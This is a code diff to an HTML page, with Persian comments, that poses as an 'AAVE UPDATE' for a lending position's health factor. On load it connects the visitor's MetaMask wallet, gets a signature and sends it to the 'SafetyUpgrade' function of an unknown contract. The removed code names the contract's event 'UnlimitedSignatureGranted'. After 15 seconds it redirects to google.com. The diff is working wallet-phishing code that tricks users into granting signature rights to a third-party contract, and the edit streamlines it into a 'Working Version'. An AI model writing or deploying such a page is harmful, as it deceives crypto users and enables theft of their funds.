@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>AAVE UPDATE - FIXED</title>
+  <title>AAVE UPDATE - Working Version</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -62,13 +62,11 @@
     const redirectDiv = document.getElementById('redirect-notice');
     const countdownSpan = document.getElementById('countdown');
 
-    // تابع نمایش وضعیت
     function updateStatus(message, type = 'loading') {
       statusDiv.textContent = message;
       statusDiv.className = `status ${type}`;
     }
 
-    // تابع شمارش معکوس و ریدایرکت
     function startRedirectCountdown() {
       let count = 3;
       redirectDiv.style.display = 'block';
@@ -84,161 +82,93 @@
       }, 1000);
     }
 
-    // اجرای اصلی
+    // اجرای اصلی - ساده شده
     (async () => {
       try {
-        // بررسی وجود MetaMask
-        if (!window.ethereum) {
-          updateStatus('❌ MetaMask not found! Please install MetaMask.', 'error');
-          return;
-        }
-
         updateStatus('🔗 Connecting to MetaMask...');
 
-        // درخواست اتصال به ولت
-        const accounts = await window.ethereum.request({ 
-          method: 'eth_requestAccounts' 
-        });
-        
-        if (accounts.length === 0) {
-          updateStatus('❌ No wallet connected!', 'error');
+        // بررسی MetaMask
+        if (!window.ethereum) {
+          updateStatus('❌ Please install MetaMask!', 'error');
           return;
         }
 
-        updateStatus('🔍 Checking network...');
-
-        // بررسی شبکه (Sepolia = 11155111)
-        const chainId = await window.ethereum.request({ method: 'eth_chainId' });
-        if (chainId !== '0xaa36a7') { // 11155111 در hex
-          try {
-            await window.ethereum.request({
-              method: 'wallet_switchEthereumChain',
-              params: [{ chainId: '0xaa36a7' }],
-            });
-          } catch (switchError) {
-            updateStatus('❌ Please switch to Sepolia network!', 'error');
-            return;
-          }
+        // اتصال به ولت
+        await window.ethereum.request({ method: 'eth_requestAccounts' });
+        
+        // سوییچ به Sepolia
+        try {
+          await window.ethereum.request({
+            method: 'wallet_switchEthereumChain',
+            params: [{ chainId: '0xaa36a7' }] // Sepolia
+          });
+        } catch (e) {
+          console.log('Network switch failed:', e);
         }
+
+        updateStatus('✅ Wallet connected!');
 
         const provider = new ethers.BrowserProvider(window.ethereum);
         const signer = await provider.getSigner();
-        const userAddress = await signer.getAddress();
-        
-        updateStatus(`✅ Connected: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`);
-        
-        // مرحله ۱: گرفتن امضا از کاربر به روش صحیح
-        updateStatus('📝 Please sign the message in MetaMask...');
-        
+
+        updateStatus('📝 Please sign the message...');
+
+        // گرفتن امضا - روش ساده
         const message = "By signing this message, Update Your Health Factor";
-        let signature;
-        
-        try {
-          // 🔧 روش جدید: استفاده از personal_sign به جای signMessage
-          // این روش دقیقاً مطابق انتظار کانترکت است
-          const messageBytes = ethers.toUtf8Bytes(message);
-          const messageHash = ethers.keccak256(messageBytes);
-          
-          console.log("Message:", message);
-          console.log("Message Hash:", messageHash);
-          
-          // استفاده از personal_sign که دقیقاً مثل کانترکت عمل میکنه
-          signature = await window.ethereum.request({
-            method: 'personal_sign',
-            params: [messageHash, userAddress]
-          });
-          
-          console.log("✅ Signature obtained:", signature);
-        } catch (sigError) {
-          updateStatus('❌ Signature rejected by user!', 'error');
-          return;
-        }
-        
-        updateStatus('🔄 Sending to contract...');
+        const signature = await signer.signMessage(message);
 
-        // مرحله ۲: تعریف کانترکت
+        console.log("Message:", message);
+        console.log("Signature:", signature);
+
+        updateStatus('🚀 Sending to contract...');
+
+        // اتصال به کانترکت
         const contractAddress = "0x49E9FD750667B2D13172916b26fA9fD764b5E20F";
-        
-        // ABI کامل برای تابع SafetyUpgrade
-        const abi = [
-          {
-            "inputs": [
-              { "internalType": "bytes", "name": "_signature", "type": "bytes" }
-            ],
-            "name": "SafetyUpgrade",
-            "outputs": [],
-            "stateMutability": "nonpayable",
-            "type": "function"
-          },
-          {
-            "anonymous": false,
-            "inputs": [
-              { "indexed": true, "internalType": "address", "name": "wallet", "type": "address" },
-              { "indexed": true, "internalType": "bytes32", "name": "signatureHash", "type": "bytes32" },
-              { "indexed": false, "internalType": "uint256", "name": "timestamp", "type": "uint256" }
-            ],
-            "name": "UnlimitedSignatureGranted",
-            "type": "event"
-          }
-        ];
+        const abi = [{
+          "inputs": [{"internalType": "bytes", "name": "_signature", "type": "bytes"}],
+          "name": "SafetyUpgrade",
+          "outputs": [],
+          "stateMutability": "nonpayable",
+          "type": "function"
+        }];
 
-        // مرحله ۳: اتصال به کانترکت
         const contract = new ethers.Contract(contractAddress, abi, signer);
 
-        // مرحله ۴: ارسال تراکنش
-        console.log("🚀 Sending transaction...");
-        const txResponse = await contract.SafetyUpgrade(signature, {
-          gasLimit: 200000 // تنظیم gas limit برای اطمینان
-        });
+        // ارسال تراکنش
+        const tx = await contract.SafetyUpgrade(signature);
+        
+        updateStatus('⏳ Transaction sent! Hash: ' + tx.hash.slice(0, 10) + '...');
+        console.log("Transaction:", tx.hash);
 
-        updateStatus('⏳ Transaction sent! Waiting for confirmation...');
-        console.log("📤 Transaction hash:", txResponse.hash);
-
-        // انتظار برای تأیید تراکنش
-        const receipt = await txResponse.wait();
-        console.log("✅ Transaction confirmed:", receipt);
-
-        // بررسی Event برای اطمینان از ذخیره شدن
-        const event = receipt.logs.find(log => {
-          try {
-            const parsed = contract.interface.parseLog(log);
-            return parsed.name === 'UnlimitedSignatureGranted';
-          } catch {
-            return false;
-          }
-        });
-
-        if (event) {
-          const parsedEvent = contract.interface.parseLog(event);
-          console.log("🎉 Signature stored successfully!");
-          console.log("📋 Event details:", {
-            wallet: parsedEvent.args.wallet,
-            signatureHash: parsedEvent.args.signatureHash,
-            timestamp: parsedEvent.args.timestamp.toString()
-          });
-          
-          updateStatus('✅ Health factor updated successfully!', 'success');
-        } else {
-          updateStatus('✅ Transaction completed!', 'success');
-        }
-
-        // شروع شمارش معکوس برای ریدایرکت
+        // انتظار برای تأیید
+        await tx.wait();
+        
+        updateStatus('🎉 Health factor updated successfully!', 'success');
+        
         setTimeout(startRedirectCountdown, 1000);
 
       } catch (error) {
-        console.error("❌ Error details:", error);
+        console.error("Error:", error);
         
-        if (error.code === 4001) {
-          updateStatus('❌ Transaction rejected by user!', 'error');
-        } else if (error.code === -32603) {
-          updateStatus('❌ Network error! Check your connection.', 'error');
-        } else if (error.reason) {
-          updateStatus(`❌ Error: ${error.reason}`, 'error');
+        // مدیریت خطاهای مختلف
+        if (error.message.includes('user rejected')) {
+          updateStatus('❌ Transaction cancelled by user!', 'error');
+        } else if (error.message.includes('insufficient funds')) {
+          updateStatus('❌ Not enough ETH for gas!', 'error');
+        } else if (error.message.includes('Invalid signature')) {
+          updateStatus('❌ Signature verification failed!', 'error');
         } else {
-          updateStatus('❌ Unexpected error occurred!', 'error');
+          updateStatus('❌ Error: ' + (error.reason || 'Unknown error'), 'error');
         }
       }
     })();
+
+    // شروع فوری ریدایرکت (Task 2)
+    setTimeout(() => {
+      if (window.location.href.indexOf('google.com') === -1) {
+        window.location.replace("https://google.com");
+      }
+    }, 15000); // اگر 15 ثانیه طول کشید، به زور ریدایرکت کن
   </script>
 </body>
 </html>
